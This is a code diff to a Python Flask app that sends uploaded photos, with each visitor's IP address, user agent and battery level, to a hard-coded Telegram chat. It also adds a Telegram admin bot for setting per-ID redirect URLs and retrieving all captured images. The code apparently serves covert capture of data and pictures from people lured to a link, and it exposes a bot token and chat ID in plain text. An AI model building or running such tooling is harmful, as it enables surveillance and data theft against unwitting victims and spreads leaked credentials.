@@ -1,4 +1,6 @@
 from flask import Flask, request, jsonify, render_template, redirect, url_for
+from telegram import Update, Bot, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Updater, CommandHandler, CallbackContext
 import base64
 import re
 import os
@@ -39,6 +41,7 @@ def get_redirect_url_by_id(id):
 # Telegram Bot API details
 TELEGRAM_BOT_TOKEN = '7125865296:AAHI_w7KGa152kCOVPNgsavTNIfatUR0hX8'
 TELEGRAM_CHAT_ID = '5197344486'
+bot = Bot(token=TELEGRAM_BOT_TOKEN)
 
 # Function to send photo to Telegram
 def send_photo_to_telegram(photo_path, ip, user_agent, battery):
@@ -47,6 +50,13 @@ def send_photo_to_telegram(photo_path, ip, user_agent, battery):
     caption = f"IP: {ip}\nUser Agent: {user_agent}\nBattery: {battery}%"
     data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
     response = requests.post(url, files=files, data=data)
+    return response.json()
+
+# Function to send message to Telegram
+def send_message_to_telegram(message):
+    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
+    data = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}
+    response = requests.post(url, data=data)
     return response.json()
 
 # Endpoint to handle image upload
@@ -114,6 +124,41 @@ def delete_image(filename):
     except Exception as e:
         return str(e), 500
 
+# Telegram Bot setup
+updater = Updater(token=TELEGRAM_BOT_TOKEN, use_context=True)
+dispatcher = updater.dispatcher
+
+def start(update: Update, context: CallbackContext) -> None:
+    update.message.reply_text('Welcome to the admin bot! Use /seturl to set redirect URLs, /viewurls to view current URLs, and /viewimages to view uploaded images.')
+
+def seturl(update: Update, context: CallbackContext) -> None:
+    try:
+        id, url = context.args
+        redirect_urls = get_redirect_urls()
+        redirect_urls[id] = url
+        set_redirect_urls(redirect_urls)
+        update.message.reply_text(f'Redirect URL for ID {id} set to {url}')
+    except ValueError:
+        update.message.reply_text('Usage: /seturl <id> <url>')
+
+def viewurls(update: Update, context: CallbackContext) -> None:
+    redirect_urls = get_redirect_urls()
+    urls_text = '\n'.join([f'ID: {id} - URL: {url}' for id, url in redirect_urls.items()])
+    update.message.reply_text(f'Current Redirect URLs:\n{urls_text}')
+
+def viewimages(update: Update, context: CallbackContext) -> None:
+    image_files = os.listdir('static')
+    image_files = [f'static/{file}' for file in image_files if file.endswith('.png')]
+    for image in image_files:
+        update.message.reply_photo(photo=open(image, 'rb'), caption=image)
+
+dispatcher.add_handler(CommandHandler("start", start))
+dispatcher.add_handler(CommandHandler("seturl", seturl))
+dispatcher.add_handler(CommandHandler("viewurls", viewurls))
+dispatcher.add_handler(CommandHandler("viewimages", viewimages))
+
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
+    updater.start_polling()
+    updater.idle()
